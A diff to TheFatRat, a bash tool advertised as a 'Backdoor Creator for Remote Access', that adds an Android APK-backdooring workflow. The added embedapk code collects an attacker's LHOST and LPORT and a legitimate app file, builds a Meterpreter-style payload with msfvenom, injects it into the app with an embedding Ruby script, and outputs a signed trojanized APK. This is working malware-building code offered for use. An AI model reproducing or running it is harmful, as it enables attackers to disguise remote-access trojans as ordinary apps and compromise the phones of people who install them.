@@ -3,7 +3,7 @@
 #	THEFATRAT
 #
 #	Welcome and dont disclaimer
-#	fatrat Author By Edo -maland-
+#	fatrat Author By Edo -maland- { screetec }
 #	Tested On , Backbox , kali Linux and Kali sana v.2
 #	contact me in screetsec@gmail.com or screetsec@dracos-linux.org
 #	DISTRO Penetration From Indonesia : https://dracos-linux.org/
@@ -98,12 +98,13 @@ RESET="\033[00m" #normal
 #SAMARAN TAMPAN
 
 path=`pwd`
-Versi=1.9.0
+Versi=1.9b
 codename=Whistle
 OS=`uname` #
 distro="$(awk -F '=' '/^ID=/ {print $2}' /etc/os-release 2>&-)"
 disrov="$(awk -F '=' '/^VERSION_ID=/ {print $2}' /etc/os-release 2>&-)"
 SERVICE=service;
+apkembed='tools/apkembed.rb' # exec script path
 pwned='python tools/pw_exec.py'
 B='tools/prog.cs'
 C='tools/dad.c'
@@ -221,6 +222,51 @@ else
    echo [x]::[warning]:this script require apache2 to work ;
    echo ""
    echo [!]::Run setup.sh to install apache2 ;
+   echo ""
+   sleep 2
+   exit 1
+fi
+sleep 2
+
+# check if ruby exists
+      which ruby > /dev/null 2>&1
+      if [ "$?" -eq "0" ]; then
+      echo [✔]::[Ruby]: installation found!; 
+else
+
+   echo [x]::[warning]:this script require ruby to work ;
+   echo ""
+   echo [!]::Run setup.sh to install ruby ;
+   echo ""
+   sleep 2
+   exit 1
+fi
+sleep 2
+
+# check if apktool exists
+      which apktool > /dev/null 2>&1
+      if [ "$?" -eq "0" ]; then
+      echo [✔]::[Apktool]: installation found!; 
+else
+
+   echo [x]::[warning]:this script require apktool to work ;
+   echo ""
+   echo [!]::Run setup.sh to install apktool ;
+   echo ""
+   sleep 2
+   exit 1
+fi
+sleep 2
+
+# check if aapt exists
+      which aapt > /dev/null 2>&1
+      if [ "$?" -eq "0" ]; then
+      echo [✔]::[Aapt]: installation found!; 
+else
+
+   echo [x]::[warning]:this script require aapt to work ;
+   echo ""
+   echo [!]::Run setup.sh to install aapt ;
    echo ""
    sleep 2
    exit 1
@@ -884,8 +930,8 @@ echo -e $okegreen"  ============================================================
 
 #EMBEDBACKDOORAPK
 function embedapk() {
+resize -s 36 87 > /dev/null
 clear
-resize -s 42 85 > /dev/null
 echo -e $okegreen"[ ]===========================================================================$okegreen[ ]"
 echo -e $okegreen"[ ]$cyan                                                                      $okegreen     [ ]"
 echo -e $okegreen"[ ]$cyan                          )  (         )      )   (    (        )     $okegreen     [ ]   ";
@@ -908,21 +954,34 @@ sleep 2
 echo -e $red" Done!"
 echo -e $okegreen""
 sleep 1
-echo -ne " SET LHOST : ";tput sgr0
-read yourip
-echo ""
-echo -ne $okegreen "SET LPORT : ";tput sgr0
-read yourport
-echo ""
-echo -ne $okegreen "Located Original Apk file for embed (example:/root/bckdoor/instagram.apk) :" ;tput sgr0
-read copyfile
+data=$(zenity --forms --title="LHOST & LPORT CONFIG." --text="`printf "Write your LHOST and LPORT \n Ex. LHOST : 192.168.1.60 \n Ex. LPORT : 5678"`" \
+--add-entry="LHOST :" \
+--add-entry="LPORT :")
+rm -rf host.tmp >/dev/null 2>&1
+touch host.tmp
+echo $data > host.tmp
+tr "|" "\n" <host.tmp >host1.tmp
+yourip=`sed -n 1p host1.tmp`
+yourport=`sed -n 2p host1.tmp`
+rm -rf host.tmp >/dev/null 2>&1
+rm -rf host1.tmp >/dev/null 2>&1
+if [[ -z $yourip ]] 
+then
+zenity --no-wrap --error --text="Your LHOST was empty ."
+menu
+elif [[ -z $yourport ]]
+then
+zenity --no-wrap --error --text="Your LPORT was empty ."
+menu
+fi
+
+copyfile=$(zenity --file-selection --file-filter='APK files (apk) | *.apk' --title="Select your app/game apk file");
 cp $copyfile $path/temp/app.apk >/dev/null 2>&1
 apkt="$path/temp/app.apk"
 
 if [ ! -f $apkt ]; then
-    echo "[!] There was an error copying your APK to a temporary folder , make sure you wrote the right path "
-    echp ""
-    read -rsp $' Press any key to continue to return to fatrat menu\n' -n 1 key
+    zenity --no-wrap --error --text="`printf "There was a problem copying your APK file \n to a temporary location \n try with other apk ."`"
+    read -rsp $'Press any key to continue to return to fatrat menu\n' -n 1 key
 menu
   fi 
 
@@ -936,6 +995,10 @@ gboor2
 spinlong
 echo ""
 sleep 1
+method=$(zenity  --list  --radiolist  --column "Pick" --column "Action" TRUE "Use NEW Backdoor-apk method" FALSE "Use OLD Backdoor-apk method" --text="Select tool to create apk :");
+case $method in 
+ 
+"Use NEW Backdoor-apk method")
 rm -f $apkconfig >/dev/null 2>&1
 touch $apkconfig 
 echo "app.apk" > $apkconfig
@@ -943,14 +1006,76 @@ echo "Rat.apk" >> $apkconfig
 echo $payload >> $apkconfig
 echo $yourip >> $apkconfig
 echo $yourport >> $apkconfig
-echo -e "\n"
 ./backdoor_apk
 echo ""
 sleep 2
-echo ""
-   read -rsp $' Press any key to continue to return to fatrat menu\n' -n 1 key
+   read -rsp $'Press any key to continue to return to fatrat menu\n' -n 1 key
 clear
 menu
+;;
+
+"Use OLD Backdoor-apk method")
+echo "Creating RAT payload with msfvenom"
+echo -e $okegreen ""
+$msfvenom -f raw -p $payload LHOST=$yourip LPORT=$yourport -o $path/temp/payload.apk
+echo "Done !" 
+sleep 2
+echo "Starting the merging process of RAT with the APK you selected"
+echo ""
+ruby $apkembed $path/temp/app.apk
+echo ""
+sleep 2
+
+fiapk=$path/temp/app_backdoored.apk
+if [ -f "$fiapk" ]
+then
+echo -e $green "[*] Backdoor apk created sucefully"
+else
+echo -e $red "[!] There was an error in the creation of your RAT APK file , the possible reasons are :
+- The architecture of the file is not for android 
+- The original APK is protected
+- It was not possible to inject the payload in the hook you selected (in this case select a different hook point)" 
+echo -e $green ""
+rm -rf temp/* > /dev/null 2>&1
+read -rsp $'Press any key to return to fatrat menu\n' -n 1 key
+menu
+fi
+
+#looking if already exists a previous backdoor apk created and renaming it
+
+ren=`shuf -i 1-1000 -n 1`
+back=$path/backdoored/app_backdoored.apk
+if [ -f "$back" ]
+then
+mv $path/backdoored/app_backdoored.apk $path/backdoored/app_backdoored_$ren.apk
+echo -e $yellow "FatRat Detected that you already had a previous created backdoor
+file in ($path/backdoored/) with the name app_backdoored.apk ."
+echo -e $okegreen "FatRat have renamed your old backdoor to app_backdoored_$ren.apk"
+mv $path/temp/app_backdoored.apk $path/backdoored/app_backdoored.apk
+else
+mv $path/temp/app_backdoored.apk $path/backdoored/app_backdoored.apk
+fi
+
+varopt="$path/backdoored/app_backdoored.apk"
+if [ ! -f $varopt ]; then
+    echo -e $red "[!] There was an error copying your Rat app to final destination"
+    read -rsp $'Press any key to continue to return to fatrat menu\n' -n 1 key
+menu
+fi
+
+echo -e $yellow "Your payload has been successfully & signed and it is located at :
+ $path/backdoored/app_backdoored.apk"
+sleep 2
+echo -e $okegreen "Removing temporary files"
+sleep 2
+rm -rf $path/temp/* >/dev/null 2>&1
+echo -e $okegreen ""
+read -rsp $'Press any key to return to fatrat menu\n' -n 1 key
+echo
+clear
+menu
+;;
+esac
 }
 
 ###########################################################
@@ -1837,8 +1962,6 @@ echo -e $white "Special thanks to:"
 echo
 echo -e $red "Dracos Linux ( www.dracos-linux.org )"
 echo
-echo -e $red "peterpt my friends for best contribute"
-echo
 echo -e $red "Offensive Security for the awesome OS"
 echo
 echo -e $green "http://www.offensive-security.com/"
@@ -1872,7 +1995,7 @@ menu () {
   echo -e $okegreen"    J  \.|'.\/ \                  				"
   echo -e $okegreen"    | |_.|. | | |   $white"[$okegreen--$white] $cyan " $white"Backdoor" Creator for Remote Acces $white[$okegreen--$white] 	"
   echo -e $okegreen"     \__.' .|-' /   $white"[$okegreen--$white] $cyan" Created by: "$red"Edo Maland (Screetsec) $white[$okegreen--$white]	"
-  echo -e $okegreen"     L   /|o'--'\   $white"[$okegreen--$white] $cyan"           Version: $red"$Versi"           $white[$okegreen--$white]	"
+  echo -e $okegreen"     L   /|o'--'\   $white"[$okegreen--$white] $cyan"           Version: $red"$Versi"             $white[$okegreen--$white]	"
   echo -e $okegreen"     |  /\/\/\   \  $white"[$okegreen--$white] $cyan"         Codename: $red"$codename"          $white[$okegreen--$white]    "
   echo -e $okegreen"     J /      \.__\ $white"[$okegreen--$white] $cyan"  Follow me on Github: $red@Screetsec   $white[$okegreen--$white]	"
   echo -e $okegreen"     J /      \.__\ $white"[$okegreen--$white] $cyan"  Dracos Linux : $red@dracos-linux.org  $white[$okegreen--$white]	"
@@ -2070,7 +2193,7 @@ echo -e $okegreen"     /\ \.-.' \      $okegreen  |_| |_|_|___|__|  |___|_| |__|
 echo -e $okegreen"    J  \.|'.\/ \                  				"
 echo -e $okegreen"    | |_.|. | | |   $white"[$okegreen--$white] $cyan " $white"Backdoor" Creator for Remote Acces $white[$okegreen--$white] 	"
 echo -e $okegreen"     \__.' .|-' /   $white"[$okegreen--$white] $cyan" Created by: "$red"Edo Maland (Screetsec) $white[$okegreen--$white]	"
-echo -e $okegreen"     L   /|o'--'\   $white"[$okegreen--$white] $cyan"           Version: $red"$Versi"           $white[$okegreen--$white]	"
+echo -e $okegreen"     L   /|o'--'\   $white"[$okegreen--$white] $cyan"           Version: $red"$Versi"            $white[$okegreen--$white]	"
 echo -e $okegreen"     |  /\/\/\   \  $white"[$okegreen--$white] $cyan"         Codename: $red"$codename"          $white[$okegreen--$white]    "
 echo -e $okegreen"     J /      \.__\ $white"[$okegreen--$white] $cyan"  Follow me on Github: $red@Screetsec   $white[$okegreen--$white]	"
 echo -e $okegreen"     J /      \.__\ $white"[$okegreen--$white] $cyan"  Dracos Linux : $red@dracos-linux.org  $white[$okegreen--$white]	"
